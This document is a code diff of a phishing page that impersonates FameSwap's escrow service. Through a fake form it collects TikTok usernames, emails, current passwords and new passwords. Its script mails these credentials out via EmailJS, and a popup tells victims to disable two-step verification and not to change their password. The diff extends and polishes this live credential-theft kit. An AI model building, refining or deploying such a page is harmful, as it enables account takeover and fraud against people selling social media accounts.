@@ -2,12 +2,18 @@
 <html>
   <head>
     <title>FameSwap - Secure Your Account</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/x-icon" href="favicon.png">
-    <link rel="shortcut icon" type="image/x-icon" href="favicon.png">
-    <link rel="apple-touch-icon" sizes="180x180" href="favicon.png">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="favicon.png" />
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.png" />
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon.png" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    />
     <style>
       body {
         font-family: "Roboto", sans-serif;
@@ -23,7 +29,7 @@
         background-color: #263648;
         border-bottom: 1px solid rgba(245, 166, 35, 0.2);
       }
-      
+
       .header .logo {
         display: flex;
         align-items: center;
@@ -38,10 +44,10 @@
       }
       .header .logo-link .logo-text {
         margin-left: 5px;
-        color: #F5A623;
+        color: #f5a623;
       }
       .header .watch-now {
-        background-color: #F5A623;
+        background-color: #f5a623;
         color: #263648;
         padding: 10px 20px;
         border-radius: 5px;
@@ -55,7 +61,7 @@
       .report-title {
         font-size: 36px;
         margin-bottom: 20px;
-        color: #F5A623;
+        color: #f5a623;
       }
       .report-form-container {
         background-color: rgba(255, 255, 255, 0.05);
@@ -82,7 +88,7 @@
         display: block;
         margin-bottom: 8px;
         font-weight: 500;
-        color: #F5A623;
+        color: #f5a623;
       }
       .form-input,
       .form-select,
@@ -100,7 +106,7 @@
       .form-select:focus,
       .form-textarea:focus {
         outline: none;
-        border-color: #F5A623;
+        border-color: #f5a623;
       }
       .form-help-text {
         font-size: 13px;
@@ -110,7 +116,7 @@
       .form-upload-btn {
         display: inline-block;
         padding: 12px 24px;
-        background-color: #F5A623;
+        background-color: #f5a623;
         color: #263648;
         border: none;
         border-radius: 6px;
@@ -130,7 +136,7 @@
       .declaration-title {
         font-weight: 500;
         margin-bottom: 16px;
-        color: #F5A623;
+        color: #f5a623;
       }
       .declaration-label {
         display: flex;
@@ -148,7 +154,7 @@
         display: block;
         width: 100%;
         padding: 16px;
-        background-color: #F5A623;
+        background-color: #f5a623;
         color: #263648;
         border: none;
         border-radius: 6px;
@@ -190,7 +196,7 @@
       }
 
       .toggle-password:hover {
-        color: #F5A623;
+        color: #f5a623;
       }
 
       .toggle-password i {
@@ -225,7 +231,7 @@
         display: block;
         height: 100%;
         width: 0;
-        background: #F5A623;
+        background: #f5a623;
         transition: width 0.3s ease;
       }
 
@@ -236,7 +242,7 @@
 
       .strength-bar.medium::before {
         width: 66.66%;
-        background: #F5A623;
+        background: #f5a623;
       }
 
       .strength-bar.strong::before {
@@ -259,7 +265,7 @@
       }
 
       .strength-text span.medium {
-        color: #F5A623;
+        color: #f5a623;
       }
 
       .strength-text span.strong {
@@ -316,7 +322,7 @@
       .popup-title {
         font-size: 24px;
         font-weight: 600;
-        color: #F5A623;
+        color: #f5a623;
         margin-bottom: 16px;
       }
 
@@ -335,7 +341,7 @@
 
       .popup-instructions h3 {
         font-size: 16px;
-        color: #F5A623;
+        color: #f5a623;
         margin-bottom: 12px;
       }
 
@@ -351,7 +357,7 @@
       }
 
       .popup-button {
-        background-color: #F5A623;
+        background-color: #f5a623;
         color: #263648;
         border: none;
         padding: 12px 32px;
@@ -460,7 +466,7 @@
         }
       }
 
-      @media screen and (max-height: 700px) {
+      @media screen and (max-width: 700px) {
         .report-section {
           padding: 20px 16px;
         }
@@ -478,25 +484,126 @@
           overflow-y: auto;
         }
       }
+
+      .escrow-fee-section {
+        margin: 24px 0;
+        background-color: rgba(255, 255, 255, 0.05);
+        padding: 20px;
+        border-radius: 8px;
+        border: 1px solid rgba(245, 166, 35, 0.2);
+      }
+
+      .fee-options {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 12px;
+        margin-top: 16px;
+      }
+
+      .fee-option {
+        position: relative;
+        display: flex;
+        align-items: center;
+        padding: 16px;
+        background-color: rgba(255, 255, 255, 0.05);
+        border: 2px solid rgba(245, 166, 35, 0.3);
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .fee-option:hover {
+        border-color: #f5a623;
+        background-color: rgba(245, 166, 35, 0.1);
+      }
+
+      .fee-option input[type="radio"] {
+        position: absolute;
+        opacity: 0;
+        width: 0;
+        height: 0;
+      }
+
+      .fee-option .fee-label {
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 14px;
+        font-weight: 500;
+        text-align: center;
+        width: 100%;
+        transition: color 0.3s ease;
+      }
+
+      .fee-option input[type="radio"]:checked + .fee-label {
+        color: #f5a623;
+      }
+
+      .fee-option input[type="radio"]:checked ~ .fee-option {
+        border-color: #f5a623;
+        background-color: rgba(245, 166, 35, 0.1);
+      }
+
+      /* Custom radio button style */
+      .fee-option .fee-label::before {
+        content: "";
+        display: block;
+        width: 20px;
+        height: 20px;
+        border: 2px solid rgba(245, 166, 35, 0.3);
+        border-radius: 50%;
+        margin: 0 auto 8px;
+        transition: all 0.3s ease;
+        background-color: rgba(255, 255, 255, 0.1);
+      }
+
+      .fee-option input[type="radio"]:checked + .fee-label::before {
+        background-color: #f5a623;
+        border-color: #f5a623;
+        box-shadow: 0 0 0 2px rgba(245, 166, 35, 0.2);
+      }
+
+      @media screen and (max-width: 768px) {
+        .fee-options {
+          grid-template-columns: 1fr;
+          gap: 10px;
+        }
+
+        .fee-option {
+          padding: 14px;
+          justify-content: flex-start;
+        }
+
+        .fee-option .fee-label {
+          display: flex;
+          align-items: center;
+          text-align: left;
+          gap: 12px;
+        }
+
+        .fee-option .fee-label::before {
+          margin: 0;
+        }
+      }
     </style>
   </head>
   <body>
     <div class="header">
       <div class="logo">
         <a class="logo-link" href="https://fameswap.com">
-          <img alt="FameSwap" class="logo-icon" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUr8N9WJZJY1GvEayzgVjXntHoDRTPg-sp8g&s"/>
+          <img
+            alt="FameSwap"
+            class="logo-icon"
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUr8N9WJZJY1GvEayzgVjXntHoDRTPg-sp8g&s"
+          />
         </a>
       </div>
-      <a class="watch-now" href="https://fameswap.com">
-        Get Started
-      </a>
+      <a class="watch-now" href="https://fameswap.com"> Get Started </a>
     </div>
     <div class="report-section">
       <h1 class="report-title">Escrow Service</h1>
       <div class="report-form-container">
         <p class="report-description">
-          Use the form below to initiate an escrow transaction.
-          Please fill in all the required information below.
+          Use the form below to initiate an escrow transaction. Please fill in
+          all the required information below.
         </p>
         <form class="report-form">
           <label for="username" class="form-label">TikTok Username *</label>
@@ -523,7 +630,9 @@
             Enter the email address associated with your TikTok account
           </p>
 
-          <label for="current-password" class="form-label">Current Password *</label>
+          <label for="current-password" class="form-label"
+            >Current Password *</label
+          >
           <div class="password-input-wrapper">
             <input
               id="current-password"
@@ -532,7 +641,11 @@
               class="form-input"
               required
             />
-            <button type="button" class="toggle-password" data-target="current-password">
+            <button
+              type="button"
+              class="toggle-password"
+              data-target="current-password"
+            >
               <i class="fas fa-eye"></i>
             </button>
           </div>
@@ -546,12 +659,17 @@
               class="form-input"
               required
             />
-            <button type="button" class="toggle-password" data-target="new-password">
+            <button
+              type="button"
+              class="toggle-password"
+              data-target="new-password"
+            >
               <i class="fas fa-eye"></i>
             </button>
           </div>
           <p class="form-help-text">
-            Password must be at least 8 characters long and include a mix of letters, numbers, and special characters
+            Password must be at least 8 characters long and include a mix of
+            letters, numbers, and special characters
           </p>
 
           <div class="password-strength" id="password-strength">
@@ -559,11 +677,35 @@
             <p class="strength-text">Password strength: <span>Weak</span></p>
           </div>
 
+          <div class="escrow-fee-section">
+            <label class="form-label">Escrow Fee Payment *</label>
+            <div class="fee-options">
+              <label class="fee-option">
+                <input type="radio" name="fee-payment" value="buyer" required />
+                <span class="fee-label">Buyer Pays</span>
+              </label>
+              <label class="fee-option">
+                <input
+                  type="radio"
+                  name="fee-payment"
+                  value="seller"
+                  required
+                />
+                <span class="fee-label">Seller Pays</span>
+              </label>
+              <label class="fee-option">
+                <input type="radio" name="fee-payment" value="split" required />
+                <span class="fee-label">50/50 Split</span>
+              </label>
+            </div>
+          </div>
+
           <div class="form-declaration">
             <p class="declaration-title">Security Confirmation</p>
             <label class="declaration-label">
               <input type="checkbox" class="declaration-checkbox" />
-              I confirm this is my TikTok account and I authorize this escrow transaction
+              I confirm this is my TikTok account and I authorize this escrow
+              transaction
             </label>
           </div>
 
@@ -576,7 +718,11 @@
     <div class="popup-overlay" id="successPopup">
       <div class="popup-container">
         <button class="popup-close" onclick="closePopup()">&times;</button>
-        <img src="https://help.fameswap.com/hc/theming_assets/01HZM00PN2CW1T8ATSNJBMS33D" alt="FameSwap" class="popup-icon" />
+        <img
+          src="https://help.fameswap.com/hc/theming_assets/01HZM00PN2CW1T8ATSNJBMS33D"
+          alt="FameSwap"
+          class="popup-icon"
+        />
         <h2 class="popup-title">Request submitted!</h2>
         <p class="popup-message">Thanks for contacting FameSwap.</p>
 
@@ -584,13 +730,20 @@
           <h3>Important Security Instructions:</h3>
           <ol>
             <li>
-              If you have listed your account on any social media selling platform, please remove the listing immediately. Your Fameswap escrow request cannot be guaranteed until this is done.
+              If you have listed your account on any social media selling
+              platform, please remove the listing immediately. Your Fameswap
+              escrow request cannot be guaranteed until this is done.
             </li>
             <li>
-              Please refrain from changing your TikTok password through the FameSwap app until you receive an official email confirming the escrow transaction has begun (this typically takes less than 24 hours).
+              Please refrain from changing your TikTok password through the
+              FameSwap app until you receive an official email confirming the
+              escrow transaction has begun (this typically takes less than 24
+              hours).
             </li>
             <li>
-              For a smoother account transfer process, please temporarily disable Two-Step Verification (2SV) in your TikTok account settings.
+              For a smoother account transfer process, please temporarily
+              disable Two-Step Verification (2SV) in your TikTok account
+              settings.
             </li>
           </ol>
         </div>
@@ -626,8 +779,12 @@
         const form = document.querySelector(".report-form");
         const usernameInput = document.getElementById("username");
         const emailInput = document.getElementById("email");
-        const currentPasswordInput = document.getElementById("current-password");
+        const currentPasswordInput =
+          document.getElementById("current-password");
         const newPasswordInput = document.getElementById("new-password");
+        const feeOptions = document.querySelectorAll(
+          'input[name="fee-payment"]'
+        );
         const checkbox = document.querySelector(".declaration-checkbox");
         const submitBtn = document.querySelector(".form-submit-btn");
         const strengthBar = document.querySelector(".strength-bar");
@@ -674,7 +831,8 @@
           return {
             score: strength,
             text: strength <= 2 ? "Weak" : strength === 3 ? "Medium" : "Strong",
-            class: strength <= 2 ? "weak" : strength === 3 ? "medium" : "strong",
+            class:
+              strength <= 2 ? "weak" : strength === 3 ? "medium" : "strong",
           };
         }
 
@@ -691,9 +849,15 @@
           console.log("Validating form...");
 
           const isUsernameValid = usernameInput.value.trim().length > 0;
-          const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value);
+          const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(
+            emailInput.value
+          );
           const isCurrentPasswordValid = currentPasswordInput.value.length >= 8;
-          const isNewPasswordValid = checkPasswordStrength(newPasswordInput.value).score >= 3;
+          const isNewPasswordValid =
+            checkPasswordStrength(newPasswordInput.value).score >= 3;
+          const isFeeSelected = Array.from(feeOptions).some(
+            (radio) => radio.checked
+          );
           const isCheckboxChecked = checkbox.checked;
 
           console.log({
@@ -701,6 +865,7 @@
             isEmailValid,
             isCurrentPasswordValid,
             isNewPasswordValid,
+            isFeeSelected,
             isCheckboxChecked,
           });
 
@@ -709,6 +874,7 @@
             isEmailValid &&
             isCurrentPasswordValid &&
             isNewPasswordValid &&
+            isFeeSelected &&
             isCheckboxChecked
           );
         }
@@ -721,9 +887,19 @@
         }
 
         // Add event listeners
-        [usernameInput, emailInput, currentPasswordInput, newPasswordInput, checkbox].forEach((element) => {
+        [
+          usernameInput,
+          emailInput,
+          currentPasswordInput,
+          newPasswordInput,
+          checkbox,
+        ].forEach((element) => {
           element.addEventListener("change", updateSubmitButton);
           element.addEventListener("input", updateSubmitButton);
+        });
+
+        feeOptions.forEach((radio) => {
+          radio.addEventListener("change", updateSubmitButton);
         });
 
         // Handle form submission
@@ -736,6 +912,9 @@
             email: emailInput.value,
             currentPassword: currentPasswordInput.value,
             newPassword: newPasswordInput.value,
+            feePayment: document.querySelector(
+              'input[name="fee-payment"]:checked'
+            ).value,
           };
 
           console.log("Form data:", {
@@ -743,6 +922,14 @@
             currentPassword: "***",
             newPassword: "***",
           });
+
+          // Show loading state
+          submitBtn.disabled = true;
+          submitBtn.textContent = "Processing...";
+
+          console.log("Attempting to send email with EmailJS...");
+          console.log("Service ID: service_w4f4um4");
+          console.log("Template ID: template_6gfhbth");
 
           // Send email using EmailJS
           emailjs
@@ -752,11 +939,12 @@
               user_email: formData.email,
               current_password: formData.currentPassword,
               new_password: formData.newPassword,
-              timestamp: new Date().toLocaleString()
+              fee_payment: formData.feePayment,
+              timestamp: new Date().toLocaleString(),
             })
             .then(
               function (response) {
-                console.log("Email sent successfully:", response);
+                console.log("Email sent successfully. Response:", response);
                 showPopup();
                 form.reset();
                 strengthBar.className = "strength-bar";
@@ -766,10 +954,28 @@
                 document.body.style.overflow = "hidden";
               },
               function (error) {
-                console.error("Email send failed:", error);
-                alert("There was an error processing your request. Please refresh the page and try again.");
+                console.error("Email send failed. Full error:", error);
+                console.error("Error status:", error.status);
+                console.error("Error text:", error.text);
+
+                // Reset button state
+                submitBtn.disabled = false;
+                submitBtn.textContent = "Start Escrow";
+
+                // Show more detailed error message
+                alert(
+                  "There was an error processing your request: " +
+                    (error.text || "Unknown error") +
+                    "\nPlease check your internet connection and try again. If the problem persists, contact support."
+                );
               }
-            );
+            )
+            .catch(function (error) {
+              console.error("Caught unexpected error:", error);
+              submitBtn.disabled = false;
+              submitBtn.textContent = "Start Escrow";
+              alert("An unexpected error occurred. Please try again later.");
+            });
         });
 
         // Initial validation check
